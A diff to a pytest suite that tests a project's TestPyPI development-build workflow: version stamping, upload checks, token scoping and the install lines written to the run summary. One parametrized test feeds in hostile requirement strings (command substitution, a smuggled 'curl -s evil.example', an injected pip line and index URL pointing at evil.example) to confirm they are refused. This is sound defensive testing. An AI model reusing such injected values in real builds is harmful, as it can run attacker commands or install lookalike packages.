@@ -14,15 +14,23 @@ import dataclasses
 import io
 import json
 import re
+import shlex
+import shutil
+import subprocess
+import sys
+import textwrap
 import tomllib
+import zipfile
 from enum import StrEnum
 from pathlib import Path
 from typing import Any, Literal
 
+import dev_version
 import jsonschema
 import pytest
 import site_versions
 import verify_symbols
+from packaging.version import Version
 from pydantic import BaseModel, ValidationError
 
 from conftest import DEMO
@@ -40,6 +48,7 @@ SPEC = (ROOT / "SPEC.md").read_text(encoding="utf-8")
 EDITOR_INTEGRATION = (ROOT / "docs" / "editor_integration.rst").read_text(encoding="utf-8")
 DOCS_WORKFLOW = (ROOT / ".github" / "workflows" / "docs.yml").read_text(encoding="utf-8")
 PUBLISH_WORKFLOW = (ROOT / ".github" / "workflows" / "publish.yml").read_text(encoding="utf-8")
+CI_WORKFLOW = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
 DOCS_URL = "https://sauci.github.io/ddd/"
 CONSISTENCY_CHECKS = (ROOT / "docs" / "consistency_checks.rst").read_text(encoding="utf-8")
 COMPARING_DELIVERIES = (ROOT / "docs" / "comparing_deliveries.rst").read_text(encoding="utf-8")
@@ -1838,17 +1847,30 @@ class TestPackagedResources:
         assert "/src/ddd/gui/static" in targets["sdist"]["artifacts"]
         assert "/gui" in targets["sdist"]["include"]
 
-    def test_a_release_type_checks_the_pages_it_compiles(self) -> None:
+    @pytest.mark.parametrize(
+        ("source", "start"),
+        [
+            (".github/workflows/publish.yml", "\n  build:\n"),
+            ("docker/Dockerfile", " AS pages\n"),
+            (".github/workflows/ci.yml", "\n  dev-build:\n"),
+        ],
+        ids=["the release build", "the image", "the development build"],
+    )
+    def test_every_build_that_packages_the_pages_type_checks_them(
+        self, source: str, start: str
+    ) -> None:
         """``npm run build`` is ``vite build``, which strips the types without checking them, so
         a file format the pages have not caught up with fails a build only where the type check
-        runs - and a release can be cut from a commit ci never saw."""
-        build = PUBLISH_WORKFLOW.split("\n  build:\n", 1)[1]
-        step = next(
+        runs. A release can be cut from a commit ci never saw, and an image built from a tree
+        it never saw; without the check the types generated before the build are generated for
+        nothing."""
+        section = (ROOT / source).read_text(encoding="utf-8").split(start, 1)[1]
+        command = next(
             line
-            for line in build.splitlines()
-            if line.strip().startswith("- run:") and "npm run build" in line
+            for line in section.splitlines()
+            if "npm run build" in line and not line.lstrip().startswith("#")
         )
-        assert "npm run schemas && npm run typecheck && npm run build" in step, step.strip()
+        assert "npm run schemas && npm run typecheck && npm run build" in command, command.strip()
 
     def test_the_developer_page_names_the_licences_the_pages_may_bundle(self) -> None:
         """Exactly the ones the build accepts: "BSD" named a family whose members other than
@@ -2500,6 +2522,507 @@ class TestTheVersionIndexOfTheSite:
         """The suite runs from the sdist, so what the suite imports has to be in the sdist."""
         metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
         assert "/tools" in metadata["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]
+
+
+def job(workflow: str, name: str) -> str:
+    """One job of a workflow, from its key to the key of the next one."""
+    assert f"\n  {name}:\n" in workflow, f"the workflow has no job called {name}"
+    body = workflow.split(f"\n  {name}:\n", 1)[1]
+    return re.split(r"\n  [a-z][\w-]*:\n", body, maxsplit=1)[0]
+
+
+def uncommented(text: str) -> str:
+    """What a workflow or a script runs, its comments left out."""
+    return "\n".join(line for line in text.splitlines() if not line.lstrip().startswith("#"))
+
+
+def step(job_text: str, name: str) -> str:
+    """One step of a job, from its ``- name:`` line to the next step."""
+    assert f"- name: {name}\n" in job_text, f"the job has no step called {name}"
+    return re.split(r"\n      - ", job_text.split(f"- name: {name}\n", 1)[1], maxsplit=1)[0]
+
+
+def run_step(step_text: str, cwd: Path, **variables: str) -> subprocess.CompletedProcess[str]:
+    """A step's ``run: |`` script, run the way the runner runs one: ``bash -e``, in ``cwd``.
+
+    The variables are exported by the script itself rather than handed over in the environment
+    of the process, so that a bash that does not inherit it - WSL's, on windows - sees them too.
+    ``python3`` is this interpreter: the runner's own is what a step calls by that name, and a
+    windows machine may have none by it.
+    """
+    block = re.search(r"^        run: \|\n((?: {10}.*\n|\n)*)", step_text + "\n", re.M)
+    assert block is not None, "the step runs no script"
+    bash = shutil.which("bash")
+    assert bash is not None, "the workflow's scripts are bash, so bash is needed to run them"
+    exports = "".join(f"export {name}={shlex.quote(value)}\n" for name, value in variables.items())
+    python3 = f'python3() {{ {shlex.quote(Path(sys.executable).as_posix())} "$@"; }}\n'
+    return subprocess.run(
+        [bash, "-e", "-c", python3 + exports + textwrap.dedent(block.group(1))],
+        cwd=cwd,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+
+
+STAMPED = ("pyproject.toml", "src/ddd/__init__.py", "cmake/Ddd.cmake")
+"""The three files the development build rewrites: what the installed package compares."""
+
+RELEASE = "1.2.3"
+"""The release the copies these tests stamp state, whatever the tree they are copied from states.
+
+The tree a development build publishes, its sdist, states a development version, and the stamp
+refuses to number a build after one: the copies are made to state a release first, so that the
+tool's own tests pass in that tree as they do in a checkout.
+"""
+
+COMMIT = "0123456789abcdef0123456789abcdef01234567"
+COMMIT_URL = f"https://github.com/Sauci/ddd/commit/{COMMIT}"
+WHEEL = "ddd_tool-0.10.1.dev57-py3-none-any.whl"
+SDIST = "ddd_tool-0.10.1.dev57.tar.gz"
+
+
+class TestTheDevelopmentBuild:
+    """The last commit of every push to master and to this repository's pull requests, on TestPyPI.
+
+    ``tools/dev_version.py`` stamps the version ci builds them under, ``<next patch>.dev<run>``,
+    into the three places the installed package compares at run time; the ``dev-build`` job of
+    ``ci.yml`` runs it, and ``dev-publish`` checks what it was handed - the version, the files,
+    the wheel's commit and requirements - before uploading it and writing the run's summary.
+    What is pinned here is what would fail silently, or in somebody else's build: a spelling
+    left behind, which ``cmake/Ddd.cmake`` refuses in the configure step of whoever installed
+    the build; a version sorting beneath the release it follows; an install line naming both
+    indexes, or written by the job that ran the build; and a job publishing from more places,
+    more files, or with more code around the token, than it should.
+    """
+
+    @pytest.fixture
+    def tree(self, tmp_path: Path) -> Path:
+        """A copy of the three files the stamp rewrites, stating ``RELEASE`` and no commit."""
+        spellings = {
+            "pyproject.toml": (r'^version = "[^"]*"$', f'version = "{RELEASE}"'),
+            "src/ddd/__init__.py": (r'^__version__ = "[^"]*"$', f'__version__ = "{RELEASE}"'),
+            "cmake/Ddd.cmake": (
+                r'^set\(DDD_MODULE_VERSION "[^"]*"\)$',
+                f'set(DDD_MODULE_VERSION "{RELEASE}")',
+            ),
+        }
+        for name, (pattern, spelled) in spellings.items():
+            text = (ROOT / name).read_text(encoding="utf-8")
+            text, count = re.subn(pattern, spelled, text, flags=re.MULTILINE)
+            assert count == 1, f"{name} no longer states its version on a line of its own"
+            # What a stamped tree's project table carries besides its version.
+            text = re.sub(r'^Commit = "[^"]*"\n', "", text, flags=re.MULTILINE)
+            target = tmp_path / name
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_text(text, encoding="utf-8", newline="\n")
+        return tmp_path
+
+    @staticmethod
+    def contents(tree: Path) -> dict[str, bytes]:
+        return {name: (tree / name).read_bytes() for name in STAMPED}
+
+    @staticmethod
+    def dist(tmp_path: Path, *names: str) -> Path:
+        """A ``dist/`` holding ``names``, empty files - or a directory, for a name ending in /."""
+        (tmp_path / "dist").mkdir()
+        for name in names:
+            if name.endswith("/"):
+                (tmp_path / "dist" / name).mkdir()
+            else:
+                (tmp_path / "dist" / name).write_bytes(b"")
+        return tmp_path
+
+    @staticmethod
+    def wheel(tmp_path: Path, *headers: str) -> Path:
+        """A ``dist/`` holding a wheel of nothing but its metadata, which is all that is read.
+
+        The headers are spelled the way hatchling writes them - ``Project-URL: <label>, <url>``,
+        and an extra's requirement marked ``extra == 'dev'`` - as read off a wheel it built.
+        """
+        (tmp_path / "dist").mkdir()
+        metadata = ["Metadata-Version: 2.5", "Name: ddd-tool", "Version: 0.10.1.dev57", *headers]
+        with zipfile.ZipFile(tmp_path / "dist" / WHEEL, "w") as archive:
+            archive.writestr(
+                "ddd_tool-0.10.1.dev57.dist-info/METADATA", "\n".join([*metadata, "", "# DDD", ""])
+            )
+        return tmp_path
+
+    @staticmethod
+    def read_requirements(cwd: Path) -> subprocess.CompletedProcess[str]:
+        """``dev-publish``'s step reading the checked wheel, as run 57 of ``COMMIT`` runs it."""
+        return run_step(
+            step(job(CI_WORKFLOW, "dev-publish"), "Read the requirements off the checked wheel"),
+            cwd,
+            VERSION="0.10.1.dev57",
+            COMMIT=COMMIT,
+            GITHUB_SERVER_URL="https://github.com",
+            GITHUB_REPOSITORY="Sauci/ddd",
+            GITHUB_OUTPUT="output",
+        )
+
+    @pytest.mark.parametrize(
+        ("release", "run", "development"),
+        [("0.10.0", 57, "0.10.1.dev57"), ("0.9.9", 3, "0.9.10.dev3"), ("1.2", 1, "1.3.dev1")],
+    )
+    def test_the_version_is_the_next_patch_of_the_release_and_the_run(
+        self, release: str, run: int, development: str
+    ) -> None:
+        assert dev_version.next_development(release, run) == development
+
+    def test_it_sorts_after_the_release_it_follows_and_before_the_next(self) -> None:
+        """Why the next patch: a development release of 0.10.0 itself sorts before 0.10.0, so
+        ``pip install --pre`` would call the release newer than every commit made after it."""
+        assert Version("0.10.0") < Version(dev_version.next_development("0.10.0", 57))
+        assert Version(dev_version.next_development("0.10.0", 57)) < Version("0.10.1")
+        assert Version("0.10.0.dev57") < Version("0.10.0")
+
+    @pytest.mark.parametrize(
+        "version", ["0.11.0rc1", "0.10.1.dev3", "0.10.0.post1", "0.10.0+g0123abc", "v0.10.0", ""]
+    )
+    def test_a_version_with_no_next_patch_is_refused(self, version: str) -> None:
+        """A release candidate has two next versions, and the others are nothing a commit of
+        master states; guessing would publish a build that sorts where nobody expects it."""
+        with pytest.raises(ValueError, match="only a version of numbers alone"):
+            dev_version.next_development(version, 57)
+
+    def test_the_three_spellings_and_the_commit_are_all_that_changes(self, tree: Path) -> None:
+        """``ddd --version`` prints ``__version__``, the module compares that with its own by
+        exact string, and ``pyproject.toml`` names the distribution: one left behind and the
+        installed build refuses itself, the way a release bumped in two of the three would."""
+        before = {name: (tree / name).read_text(encoding="utf-8") for name in STAMPED}
+        version = dev_version.stamp(tree, "57", COMMIT)
+        assert version == "1.2.4.dev57"
+        changed = {
+            "pyproject.toml": (
+                {f'version = "{RELEASE}"'},
+                {f'version = "{version}"', f'Commit = "{COMMIT_URL}"'},
+            ),
+            "src/ddd/__init__.py": (
+                {f'__version__ = "{RELEASE}"'},
+                {f'__version__ = "{version}"'},
+            ),
+            "cmake/Ddd.cmake": (
+                {f'set(DDD_MODULE_VERSION "{RELEASE}")'},
+                {f'set(DDD_MODULE_VERSION "{version}")'},
+            ),
+        }
+        for name, (removed, added) in changed.items():
+            old = before[name].splitlines()
+            new = (tree / name).read_text(encoding="utf-8").splitlines()
+            assert (set(old) - set(new), set(new) - set(old)) == (removed, added), name
+            assert len(new) - len(old) == len(added) - len(removed), name
+            # .gitattributes checks every file out with lf endings, windows included.
+            assert b"\r\n" not in (tree / name).read_bytes(), name
+        project = tomllib.loads((tree / "pyproject.toml").read_text(encoding="utf-8"))["project"]
+        assert (project["version"], project["urls"]["Commit"]) == (version, COMMIT_URL)
+
+    def test_a_tree_whose_spellings_disagree_is_refused_as_it_was(self, tree: Path) -> None:
+        """The suite refuses such a tree already; publishing it would hand the disagreement to
+        whoever installs the build, as a configure step that refuses the tool."""
+        module = tree / "cmake" / "Ddd.cmake"
+        text = module.read_text(encoding="utf-8").replace(f'"{RELEASE}")', '"0.0.1")')
+        module.write_text(text, encoding="utf-8", newline="\n")
+        before = self.contents(tree)
+        with pytest.raises(ValueError, match=r"Ddd\.cmake"):
+            dev_version.stamp(tree, "57", COMMIT)
+        assert self.contents(tree) == before
+
+    def test_a_project_naming_no_homepage_is_refused(self, tree: Path) -> None:
+        """The commit's url is the homepage's, which is this repository's."""
+        project = tree / "pyproject.toml"
+        text = project.read_text(encoding="utf-8").replace("Homepage =", "Home =")
+        project.write_text(text, encoding="utf-8", newline="\n")
+        with pytest.raises(ValueError, match="names no Homepage"):
+            dev_version.stamp(tree, "57", COMMIT)
+
+    @pytest.mark.parametrize(
+        ("run", "commit"),
+        [("", COMMIT), ("5a", COMMIT), ("-1", COMMIT), ("57", COMMIT[:7]), ("57", "")],
+    )
+    def test_what_ci_hands_it_is_checked_before_anything_is_written(
+        self, tree: Path, run: str, commit: str
+    ) -> None:
+        """An empty expression is an empty string, and a url ending in ``/commit/`` would be
+        published with nothing to say about it."""
+        before = self.contents(tree)
+        with pytest.raises(ValueError):
+            dev_version.stamp(tree, run, commit)
+        assert self.contents(tree) == before
+
+    def test_the_command_line_prints_the_version_it_stamped(
+        self, tree: Path, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        """What the job hands on, to the environment's url and to the artifact's name."""
+        assert dev_version.main(["stamp", "57", COMMIT], root=tree) == 0
+        assert capsys.readouterr().out == "1.2.4.dev57\n"
+
+    def test_a_refusal_is_a_failed_step_with_its_reason(
+        self, tree: Path, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        assert dev_version.main(["stamp", "57", "HEAD"], root=tree) == 1
+        said = capsys.readouterr()
+        assert said.out == "" and "'HEAD'" in said.err
+
+    @pytest.mark.parametrize(
+        "arguments",
+        [[], ["stamp", "57"], ["dependencies", WHEEL], ["summary", WHEEL], ["tag", "57", COMMIT]],
+    )
+    def test_anything_else_is_a_usage_error(
+        self, arguments: list[str], capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        assert dev_version.main(arguments) == 2
+        assert "usage:" in capsys.readouterr().err
+
+    def test_the_requirements_are_the_checked_wheels_own_runtime_ones(self, tmp_path: Path) -> None:
+        """Read off the wheel about to be uploaded, by the job that uploads it, so that they are
+        exactly its own - an extra's left out - and nothing ``dev-build`` printed is taken."""
+        cwd = self.wheel(
+            tmp_path,
+            f"Project-URL: Commit, {COMMIT_URL}",
+            "Project-URL: Homepage, https://github.com/Sauci/ddd",
+            "Requires-Dist: jinja2<4,>=3.1",
+            "Requires-Dist: pydantic<3,>=2.7",
+            "Provides-Extra: dev",
+            "Requires-Dist: pytest>=8.0; extra == 'dev'",
+            "Requires-Dist: colorama; sys_platform == 'win32' and extra == 'dev'",
+        )
+        read = self.read_requirements(cwd)
+        assert read.returncode == 0, read.stdout + read.stderr
+        output = (cwd / "output").read_text(encoding="utf-8")
+        assert output == 'line=pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"\n'
+
+    @pytest.mark.parametrize(
+        "requirement",
+        [
+            "pydantic<3`id`",
+            "pydantic<3$(id)",
+            'pydantic"; curl -s evil.example; "',
+            "jinja2<4\n ```\n pip install --index-url https://evil.example/simple/ ddd-tool",
+            "--index-url=evil.example",
+            "evil @ https://evil.example/evil-1.0-py3-none-any.whl",
+            'tomli>=2; python_version < "3.13"',
+            "a" * 300,
+        ],
+        ids=[
+            "a backtick",
+            "a dollar",
+            "a quote",
+            "a line break",
+            "an option",
+            "a url",
+            "a marker",
+            "an oversized requirement",
+        ],
+    )
+    def test_a_requirement_no_install_line_may_print_is_refused_before_the_upload(
+        self, tmp_path: Path, requirement: str
+    ) -> None:
+        """The wheel was built where the pages' packages ran their install scripts, so what it
+        declares is held to quoted requirements of letters, digits and the signs a specifier
+        needs, and to 200 characters. A line break, a backtick or a quote would let a planted
+        requirement close the summary's code fence, or the quoted argument, and print an install
+        line of its own; an option or a url would name another index. A marker's strings need
+        quotes too, so a runtime requirement with one is refused as well, until the day one is
+        needed. Length is checked on its own: a requirement of only allowed characters still
+        matches the pattern however long it is - one tried against it was 32 MiB."""
+        cwd = self.wheel(
+            tmp_path, f"Project-URL: Commit, {COMMIT_URL}", f"Requires-Dist: {requirement}"
+        )
+        read = self.read_requirements(cwd)
+        assert read.returncode == 1, read.stdout + read.stderr
+        assert read.stdout.startswith("::error::")
+        assert not (cwd / "output").exists(), "a refused line was handed to the summary"
+        assert "\npip install" not in read.stdout and "\n```" not in read.stdout
+
+    @pytest.mark.parametrize(
+        "urls",
+        [[], [f"Project-URL: Commit, {COMMIT_URL.replace('0123', '3210')}"]],
+        ids=["no commit", "another commit"],
+    )
+    def test_a_wheel_naming_another_commit_than_the_runs_is_refused(
+        self, tmp_path: Path, urls: list[str]
+    ) -> None:
+        """The version cannot carry the commit, so the metadata is the one place that says what
+        the build is of - and it has to say this run's."""
+        read = self.read_requirements(self.wheel(tmp_path, *urls, "Requires-Dist: pydantic<3"))
+        assert read.returncode == 1, read.stdout + read.stderr
+        assert read.stdout.startswith("::error::")
+
+    def test_the_build_runs_the_script_and_checks_the_wheel_it_builds(self) -> None:
+        """The rules above are worth nothing if the workflow does something else inline; and
+        no line of the summary is written where the build ran."""
+        build = uncommented(job(CI_WORKFLOW, "dev-build"))
+        assert "tools/dev_version.py stamp" in build
+        assert 'if "ddd/gui/static/index.html" not in names:' in build
+        assert "test.pypi.org/simple" not in build
+        assert "pip install" not in build.split('if "ddd/gui/static/index.html"', 1)[1]
+        handed = re.search(r"^    outputs:\n((?:      .*\n)+)", build + "\n", re.M)
+        assert handed is not None, "dev-build no longer hands its version over"
+        assert handed.group(1).split(":", 1)[0].strip() == "version", handed.group(1)
+        assert len(handed.group(1).splitlines()) == 1, f"dev-build hands over {handed.group(1)}"
+        assert "needs.dev-build.outputs.dependencies" not in uncommented(CI_WORKFLOW)
+
+    def test_it_waits_for_every_other_job_of_the_run(self) -> None:
+        """The maintainer was told a development build waits for the whole of ci: a commit any
+        job fails is no build to point anybody at, and a job added to ci.yml joins the wait."""
+        names = re.findall(r"^  ([a-z][\w-]*):\n", CI_WORKFLOW.split("\njobs:\n", 1)[1], re.M)
+        assert {"test", "lint", "gui"} <= set(names), f"the jobs of ci.yml are read as {names}"
+        waited = re.search(r"^    needs: \[([^]\n]*)\]$", job(CI_WORKFLOW, "dev-build"), re.M)
+        assert waited is not None, "dev-build no longer lists the jobs it waits for"
+        assert sorted(waited.group(1).split(", ")) == sorted(
+            set(names) - {"dev-build", "dev-publish"}
+        )
+
+    def test_a_branch_older_than_the_script_is_told_to_merge_master(self, tmp_path: Path) -> None:
+        """Its head has no ``tools/dev_version.py``, and python's "can't open file" says nothing
+        about why; the step before the stamp does."""
+        build = job(CI_WORKFLOW, "dev-build")
+        guard = step(build, "Check the commit carries the stamping script")
+        refused = run_step(guard, tmp_path, COMMIT=COMMIT)
+        assert refused.returncode == 1
+        assert refused.stdout.startswith("::error::") and "Merge master" in refused.stdout
+        (tmp_path / "tools").mkdir()
+        (tmp_path / "tools" / "dev_version.py").write_text("", encoding="utf-8")
+        assert run_step(guard, tmp_path, COMMIT=COMMIT).returncode == 0
+        assert build.index("carries the stamping script") < build.index("dev_version.py stamp")
+
+    def test_the_upload_is_this_runs_two_files(self, tmp_path: Path) -> None:
+        check = step(job(CI_WORKFLOW, "dev-publish"), "Check what is about to be published")
+        passed = run_step(
+            check,
+            self.dist(tmp_path, WHEEL, SDIST),
+            VERSION="0.10.1.dev57",
+            GITHUB_RUN_NUMBER="57",
+        )
+        assert passed.returncode == 0, passed.stdout + passed.stderr
+
+    @pytest.mark.parametrize(
+        ("version", "names"),
+        [
+            ("0.10.1.dev57", [WHEEL, SDIST, "ddd_tool-0.10.1.dev60-py3-none-any.whl"]),
+            (
+                "0.10.1.dev56",
+                ["ddd_tool-0.10.1.dev56-py3-none-any.whl", "ddd_tool-0.10.1.dev56.tar.gz"],
+            ),
+            ("0.10.1.dev57", [WHEEL]),
+            ("0.10.1.dev57", [WHEEL, SDIST, ".pypirc"]),
+            ("0.10.1.dev57", [f"{WHEEL}/", SDIST]),
+            ("0.10.1.dev57\n::add-mask::0.10.1.dev57", [WHEEL, SDIST]),
+        ],
+        ids=[
+            "a wheel for a later run",
+            "the version of another run",
+            "no sdist",
+            "a hidden file",
+            "a directory for a wheel",
+            "a version spanning lines",
+        ],
+    )
+    def test_anything_else_is_refused_before_the_upload(
+        self, tmp_path: Path, version: str, names: list[str]
+    ) -> None:
+        """Everything ``dev-build`` hands over was made where the pages' packages ran their
+        install scripts, so the job holding the token takes none of it on trust: a file for a
+        later run would be uploaded under that run's version and its own upload then refused,
+        and a version from another run - a renamed ``ci.yml`` restarts the numbers - would
+        point the summary at a build of another commit. Nothing it prints can start a line."""
+        check = step(job(CI_WORKFLOW, "dev-publish"), "Check what is about to be published")
+        refused = run_step(
+            check, self.dist(tmp_path, *names), VERSION=version, GITHUB_RUN_NUMBER="57"
+        )
+        assert refused.returncode == 1, refused.stdout + refused.stderr
+        assert refused.stdout.startswith("::error::")
+        assert "\n::add-mask::" not in refused.stdout
+
+    def test_the_install_lines_are_written_from_what_was_checked(self, tmp_path: Path) -> None:
+        """Both lines users copy are written by the job that checked what they name: the
+        version it checked, and the requirements it read off the checked wheel and held to a
+        pattern. Nothing of it is taken from ``dev-build`` unchecked."""
+        publish = job(CI_WORKFLOW, "dev-publish")
+        summary = step(publish, "Say what was published, and how it installs")
+        wrote = run_step(
+            summary,
+            tmp_path,
+            VERSION="0.10.1.dev57",
+            DEPENDENCIES='pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"',
+            COMMIT=COMMIT,
+            GITHUB_SERVER_URL="https://github.com",
+            GITHUB_REPOSITORY="Sauci/ddd",
+            GITHUB_STEP_SUMMARY="summary.md",
+        )
+        assert wrote.returncode == 0, wrote.stdout + wrote.stderr
+        said = (tmp_path / "summary.md").read_text(encoding="utf-8")
+        assert "ddd-tool 0.10.1.dev57" in said
+        assert COMMIT_URL in said
+        assert [line for line in said.splitlines() if line.startswith("pip install")] == [
+            'pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"',
+            "pip install --no-deps --index-url https://test.pypi.org/simple/ "
+            "ddd-tool==0.10.1.dev57",
+        ]
+        assert "anybody can upload a lookalike" in said
+        checked = "VERSION: ${{ needs.dev-build.outputs.version }}"
+        assert checked in step(publish, "Check what is about to be published")
+        assert checked in step(publish, "Read the requirements off the checked wheel")
+        assert checked in summary
+        assert "DEPENDENCIES: ${{ steps.requirements.outputs.line }}" in summary
+        order = [
+            publish.index("- name: Check what is about to be published"),
+            publish.index("- name: Read the requirements off the checked wheel"),
+            publish.index("uses: pypa/gh-action-pypi-publish"),
+            publish.index("- name: Say what was published, and how it installs"),
+        ]
+        assert order == sorted(order), "the checks, the upload and the summary are out of order"
+
+    def test_only_this_repository_publishes_one(self) -> None:
+        """A fork's pull request is given no token, and a fork's own push has no publisher on
+        TestPyPI: both skip the build rather than failing the upload after it. ``dev-publish``
+        needs ``dev-build``, so it skips with it."""
+        condition = re.search(
+            r"^    if: >-\n((?:      .*\n)+)", job(CI_WORKFLOW, "dev-build"), re.M
+        )
+        assert condition is not None, "dev-build no longer says which runs build one"
+        said = " ".join(condition.group(1).split())
+        assert "github.repository == 'Sauci/ddd'" in said
+        assert "github.event_name == 'push' && github.ref == 'refs/heads/master'" in said
+        assert "github.event.pull_request.head.repo.full_name == github.repository" in said
+        assert "needs: dev-build" in job(CI_WORKFLOW, "dev-publish")
+
+    def test_only_the_job_that_publishes_can_ask_for_a_token(self) -> None:
+        """``npm ci`` runs the install scripts of every package the pages depend on, and a build
+        runs whatever its backend is: the publishing action's own documentation asks for the
+        build and the upload to be separate jobs, and for the token on the second alone, which
+        is how publish.yml has it too. The second checks nothing out and installs nothing, so no
+        code of the repository runs beside the token: its python is the runner's own, reading
+        the workflow's own lines on its standard input."""
+        granted = [line for line in uncommented(CI_WORKFLOW).splitlines() if "id-token:" in line]
+        assert len(granted) == 1, f"ci.yml is to grant a token once, and grants {granted}"
+        publish = uncommented(job(CI_WORKFLOW, "dev-publish"))
+        assert "id-token: write" in publish, (
+            "the one job that may ask for a token is not dev-publish"
+        )
+        for code in ("actions/checkout", "setup-python", "tools/", "npm ", " -m "):
+            assert code not in publish, f"dev-publish runs {code.strip()}"
+        # The summary prints an install line; running one is another thing.
+        assert not re.search(r"^\s*(?:- )?(?:run: )?pip ", publish, re.M), "dev-publish runs pip"
+        pythons = [publish[found.start() :] for found in re.finditer(r"\bpython", publish)]
+        assert pythons, "no python is recognised in dev-publish, so this weighs nothing"
+        assert all(python.startswith(("python3 - ", "python3 -I - ")) for python in pythons), (
+            "dev-publish runs a python program other than the lines the workflow hands it"
+        )
+
+    def test_it_publishes_to_testpypi_alone_from_the_environment_the_page_registers(self) -> None:
+        """An upload without ``repository-url`` goes to pypi.org. And only a re-run may pass
+        over a file already there: on a first attempt that file came from another run - planted
+        by one, or published by a ``ci.yml`` renamed since, whose numbers have restarted - and
+        passing over it in silence would leave the run's summary naming somebody else's build."""
+        publish = uncommented(job(CI_WORKFLOW, "dev-publish"))
+        assert "repository-url: https://test.pypi.org/legacy/" in publish
+        assert "skip-existing: ${{ github.run_attempt != '1' }}" in publish
+        environment = re.search(r"environment:\n\s+name: ([\w-]+)", publish)
+        assert environment is not None, "dev-publish names no environment for the publisher"
+        assert environment.group(1) == "testpypi-dev"
+        assert f"``{environment.group(1)}``" in PAGES["docs/developer_documentation.rst"]
 
 
 class TestPreCommitHook:
